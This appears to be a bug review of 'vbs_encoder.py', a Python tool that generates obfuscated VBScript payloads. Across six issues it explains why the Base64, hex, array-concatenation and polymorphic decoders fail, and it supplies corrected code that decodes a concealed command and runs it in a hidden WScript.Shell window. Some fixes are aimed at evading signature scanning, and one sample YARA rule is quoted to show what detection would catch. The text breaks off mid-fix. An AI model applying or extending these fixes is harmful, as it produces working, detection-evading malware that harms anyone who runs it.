ISSUE #1: VARIABLE REFERENCE SCOPE MISMATCH (Base64 Decoder)
================================================================================
SEVERITY: HIGH -> CRITICAL TREND
FILE: vbs_encoder.py
LINES: 54-67

DESCRIPTION:
The create_base64_decoder_vbs() method has a critical variable scope bug that
will cause runtime failures.

CODE SNIPPET:
    def create_base64_decoder_vbs(self, payload: str, output_var: str = "p") -> str:
        encoded, var_name = self.encode_string_base64(payload)

        vbs_code = f"""
Dim {var_name}, {output_var}
{var_name} = "{encoded}"
Set {self._generate_random_name("o_")} = CreateObject("MSXML2.DOMDocument")  # LINE 61
With {self._generate_random_name("o_")}  # LINE 62 - DIFFERENT VAR NAME!
    .LoadXML "<u><![CDATA[" & {var_name} & "]]></u>"
    {output_var} = .SelectSingleNode("u").text
End With
"""

ACTUAL OUTPUT EXAMPLE:
    Dim v_OVUNPy_v, p
    v_OVUNPy_v = "dGVzdCBjb21tYW5k"
    Set o_EH7GxYks = CreateObject("MSXML2.DOMDocument")        # object1
    With o_GfRhvYN9                                              # object2 (DIFFERENT!)
        .LoadXML "<u><![CDATA[" & v_OVUNPy_v & "]]></u>"
        p = .SelectSingleNode("u").text
    End With

PROBLEM:
- Line 61 creates "o_EH7GxYks" via _generate_random_name("o_")
- Line 62 creates "o_GfRhvYN9" via _generate_random_name("o_")
- The With statement references undefined variable o_GfRhvYN9
- Runtime error: "Object expected" exception

ROOT CAUSE:
_generate_random_name() is called twice, creating two different names.
There is no way for them to refer to the same object.

IMPACT:
- PAYLOAD WILL NOT EXECUTE
- Runtime error when VBS engine processes "With" statement
- Entire Base64 decoding technique is broken
- This is a show-stopper bug

EXPECTED BEHAVIOR:
Both references should use the same variable name:
    Set o_EH7GxYks = CreateObject("MSXML2.DOMDocument")
    With o_EH7GxYks    # Same variable name
        ...
    End With

FIX:
    obj_var = self._generate_random_name("o_")  # Generate ONCE
    vbs_code = f"""
Dim {var_name}, {output_var}
{var_name} = "{encoded}"
Set {obj_var} = CreateObject("MSXML2.DOMDocument")
With {obj_var}
    .LoadXML "<u><![CDATA[" & {var_name} & "]]></u>"
    {output_var} = .SelectSingleNode("u").text
End With
"""

ISSUE #2: PLAIN-TEXT COMMAND EXPOSURE IN WSCRIPT EXECUTION
================================================================================
SEVERITY: HIGH
FILE: vbs_encoder.py
LINES: 163-170

DESCRIPTION:
Commands are embedded in plain text without encoding, making them easily
detectable by signature-based scanners.

CODE SNIPPET:
    def create_wscript_hidden_execution(self, command: str) -> str:
        vbs_code = f"""
Dim {self._generate_random_name("shell_")}, {self._generate_random_name("cmd_")}
Set {self._generate_random_name("shell_")} = CreateObject("WScript.Shell")
{self._generate_random_name("shell_")}.Run "{command}", 0, False
"""

ACTUAL OUTPUT EXAMPLE:
    Dim shell_cg_f53PG, cmd_5RcS6VT2
    Set shell_TSrAaDXM = CreateObject("WScript.Shell")     # VAR 1
    shell_j8Z89H9E.Run "cmd /c echo test", 0, False        # VAR 2 - MISMATCH!

And the command is in PLAIN TEXT:
    "cmd /c echo test"

PROBLEMS:
1. Plain-text command visible: "cmd /c echo test"
2. Variable name mismatch: Created shell_TSrAaDXM but used shell_j8Z89H9E
3. Will cause runtime error: undefined variable
4. Easily detected by YARA/SNORT patterns

ROOT CAUSE:
Each call to self._generate_random_name() creates a new name. Three calls in
the same f-string create three different variable names, but only the first
Set statement assigns to a created variable.

IMPACT:
- Obfuscation completely ineffective
- Plain-text command visible to static analysis tools
- Runtime error: undefined shell variable
- Defeats stated "undetectable" purpose

EXAMPLE YARA DETECTION:
    rule VBS_PlaintextCommand {
        strings:
            $cmd = ".Run \"cmd /c" nocase
        condition:
            all of them
    }

FIX:
    shell_var = self._generate_random_name("shell_")  # Create once
    cmd_var = self._generate_random_name("cmd_")

    vbs_code = f"""
Dim {shell_var}, {cmd_var}
Set {shell_var} = CreateObject("WScript.Shell")
{cmd_var} = "{base64_encode(command)}"  # Encode command
' ... decode logic ...
{shell_var}.Run decoded_command, 0, False
"""

ISSUE #3: HEX DECODER MISSING CREATEOBJECT AND EXECUTION
================================================================================
SEVERITY: HIGH
FILE: vbs_encoder.py
LINES: 69-84

DESCRIPTION:
Hex decoder constructs the decoded string but never executes it.
Also has variable name mismatch between function definition and call.

CODE SNIPPET:
    def create_hex_decoder_vbs(self, text: str) -> str:
        hex_encoded, var_name = self.encode_string_hex(text)

        vbs_code = f"""
Function {self._generate_random_name("DecodeHex")}(h)
    Dim i, r
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    {self._generate_random_name("DecodeHex")} = r
End Function
Dim {var_name}
{var_name} = {self._generate_random_name("DecodeHex")}("{hex_encoded}")
"""

ACTUAL OUTPUT EXAMPLE:
    Function DecodeHex5O8S6P02(h)
        Dim i, r
        For i = 1 To Len(h) Step 2
            r = r & Chr(CLng("&H" & Mid(h, i, 2)))
        Next
        DecodeHex1wAVZY_j = r              # FUNCTION NAME #2
    End Function
    Dim h_yEjkVOPQ
    h_yEjkVOPQ = DecodeHexW5xftqIx(...)   # FUNCTION NAME #3

PROBLEMS:
1. Function defined as "DecodeHex5O8S6P02" (line 1)
2. Return assigns to "DecodeHex1wAVZY_j" (random name #2)
3. Function called as "DecodeHexW5xftqIx" (random name #3)
4. No execution handler - decoded string never runs
5. Three different function names in one function!

ROOT CAUSE:
- Line 74: self._generate_random_name("DecodeHex") creates name #1
- Line 79: self._generate_random_name("DecodeHex") creates name #2
- Line 82: self._generate_random_name("DecodeHex") creates name #3

IMPACT:
- PAYLOAD WILL NOT EXECUTE
- Runtime error: undefined function (calling name #3 when name #1 was defined)
- Even if names matched, no execution handler means decoded string sits unused
- Entire hex technique broken

WHAT SHOULD HAPPEN:
    Dim hexDecoded
    hexDecoded = DecodeHex("74657374")  # Decoded = "test"
    Set shell = CreateObject("WScript.Shell")
    shell.Run hexDecoded, 0, False      # Execute "test"

FIX:
    func_name = self._generate_random_name("DecodeHex")
    output_var = self._generate_random_name("decoded_")
    shell_var = self._generate_random_name("shell_")

    vbs_code = f"""
Function {func_name}(h)
    Dim i, r
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    {func_name} = r
End Function
Dim {var_name}, {output_var}
{output_var} = {func_name}("{hex_encoded}")
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {output_var}, 0, False
"""

ISSUE #4: ARRAY CONCATENATION DECODER MISSING EXECUTION
================================================================================
SEVERITY: HIGH
FILE: vbs_encoder.py
LINES: 86-110

DESCRIPTION:
Similar to Issue #3: decoder reconstructs payload but never executes it.
The "For Each" loop builds the command string, but there's no CreateObject
or .Run call to actually execute it.

CODE SNIPPET:
    def create_array_concatenation_decoder(self, text: str) -> str:
        chunks = [text[i : i + 16] for i in range(0, len(text), 16)]

        var_name = self._generate_random_name("a_")
        arr_var = self._generate_random_name("arr_")
        out_var = self._generate_random_name("s_")

        vbs_code = f"Dim {arr_var}({len(chunks)-1})\n"

        for i, chunk in enumerate(chunks):
            encoded_chunk = binascii.hexlify(chunk.encode()).decode()
            vbs_code += f'{arr_var}({i}) = "{encoded_chunk}"\n'

        vbs_code += f"""
Dim {out_var}
For Each {var_name} In {arr_var}
    Dim i
    For i = 1 To Len({var_name}) Step 2
        {out_var} = {out_var} & Chr(CLng("&H" & Mid({var_name}, i, 2)))
    Next
Next
"""
        # Returns here - NO EXECUTION HANDLER!

ACTUAL OUTPUT:
    Dim arr_concat_123(2)
    arr_concat_123(0) = "7465737420506179..."  # hex chunk
    arr_concat_123(1) = "6c6f6164..."          # hex chunk

    Dim s_output
    For Each a_item In arr_concat_123
        Dim i
        For i = 1 To Len(a_item) Step 2
            s_output = s_output & Chr(CLng("&H" & Mid(a_item, i, 2)))
        Next
    Next
    ' [END - payload reconstructed but never executed]

PROBLEM:
The s_output variable contains the decoded command, but there's no code to
run it. The payload ends abruptly without execution handler.

IMPACT:
- Reconstructed command sits in memory but is never executed
- Payload is non-functional
- Defeats entire purpose of payload generator

FIX:
Add execution section after the decoding loop:
    vbs_code += f"""
' Execute the reconstructed payload
Set {shell_var} = CreateObject("WScript.Shell")
{shell_var}.Run {out_var}, 0, False
"""

ISSUE #5: INCONSISTENT VARIABLE NAMING IN POLYMORPHIC WRAPPER
================================================================================
SEVERITY: HIGH
FILE: vbs_encoder.py
LINES: 172-190

DESCRIPTION:
Dim statements appear in multiple scopes, causing potential VBS scope issues.

CODE SNIPPET:
    def create_polymorphic_wrapper(self, vbs_code: str) -> str:
        wrapper = "Dim "
        for _ in range(random.randint(3, 8)):
            wrapper += f"{self._generate_random_name()}, "
        wrapper = wrapper.rstrip(", ") + "\n\n"

        if random.choice([True, False]):
            wrapper += f"""
If {random.randint(0, 1)} = {random.randint(0, 1)} Then
    Dim {self._generate_random_name()} : {self._generate_random_name()} = Now()
End If
"""

PROBLEM:
Dead variables declared at module level, but assignment happens in If block.

ACTUAL OUTPUT:
    Dim a_var_1, b_var_2, c_var_3

    If 0 = 1 Then
        Dim x_dead : x_dead = Now()   # Nested Dim in If block
    End If

ISSUE:
Some VBS interpreters handle Dim inside If blocks differently. This can cause:
- Variable scope confusion
- Runtime type errors
- Inconsistent behavior across different VBS interpreters

IMPACT:
- Polymorphic variants may not be equally valid
- Some variants may fail in certain environments
- Reduces reliability of high-obfuscation payloads

FIX:
Move all Dim statements to top level:
    def create_polymorphic_wrapper(self, vbs_code: str) -> str:
        dead_vars = [self._generate_random_name() for _ in range(random.randint(3, 8))]
        wrapper = "Dim " + ", ".join(dead_vars) + "\n\n"

        if random.choice([True, False]):
            var = self._generate_random_name()
            wrapper += f"{var} = Now()\n\n"  # Assignment outside If

        wrapper += vbs_code
        return wrapper

ISSUE #6: UNMATCHED SET/NOTHING CLEANUP STATEMENTS
================================================================================
SEVERITY: LOW
FILE: vbs_encoder.py
LINES: 124-161

DESCRIPTION:
Multiple objects created via CreateObject() but not all are cleaned up with
Set var = Nothing statements.

EXAMPLE:
    ' Header creates multiple objects:
    ' Line 136: CreateObject("WScript.Shell").Environment("System")
    ' Line 137: CreateObject("WScript.Shell").Environment("User")

    ' Payload section may create more objects...

    ' Execution section:
    Set {exec_var} = CreateObject("WScript.Shell")
    {exec_var}.Run {payload_var}, 0, False
    Set {exec_var} = Nothing     # Only this one cleaned up!

PROBLEM:
Only one object is explicitly cleaned up. The objects created for environment
access are not dereferenced.

IMPACT:
- Low severity: VBS garbage collection will eventually clean up
- Bad practice: Malware analysts look for proper cleanup patterns
- Memory inefficiency: Objects held longer than necessary

FIX:
Track all created objects and clean them up:
    env_var = self._generate_random_name("env_")
    sys_var = self._generate_random_name("sysVer_")

    obf_header = f"""
Dim {sys_var}, {env_var}

Set {env_var} = Nothing
